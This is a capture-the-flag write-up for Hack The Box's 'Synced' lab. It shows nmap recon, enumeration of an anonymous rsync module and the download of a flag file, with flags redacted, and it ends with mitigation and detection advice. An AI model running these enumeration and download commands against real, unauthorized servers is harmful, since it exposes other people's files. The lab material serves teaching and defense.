---
machine: Synced
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
tags: [linux, rsync, anonymous, file-share]
---

# Synced — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available (Starting Point), publishable.
> Reference notes. No real flags or credentials.

## TL;DR

**rsync on 873 with an anonymous module**. List the modules with no credentials, pull the shared module and the flag sits in a text file. One step: speak to the service with its own tool.

## Recon

```bash
nmap -sC -sV <IP> -oN nmap.txt
```

```text
873/tcp  open  rsync  (protocol version 31)

No SSH: the box only exposes the `rsync` daemon (writeups agree port 22 does not answer).
```

```bash
nmap -p873 --script rsync-list-modules <IP>
```

## Access

```bash
rsync rsync://<IP>/            # list modules
rsync rsync://<IP>/<module>/   # list the module's contents
rsync -av rsync://<IP>/<module>/ ./loot/
```

```text
receiving file list ...
flag.txt
```

```bash
cat loot/flag.txt
```

```text
<flag>
```

If the module is writable (`rsync -av ./something rsync://<IP>/<module>/`), the service also becomes a way to drop files on the host.

## Evidence (redacted)

```text
<module>/flag.txt  ->  <flag>
```

## Lessons

- Anonymous rsync is a share with no password: it lists and downloads everything in the module.
- Modules usually point at backups or deploy directories, which is where secrets live.
- Mitigation: `auth users` plus a `secrets file` in `rsyncd.conf`, `read only = yes` unless needed, per-IP ACLs and `use chroot = yes`.
- Detection: 873 connections from outside the admin network and `@RSYNCD: OK` in the traffic.
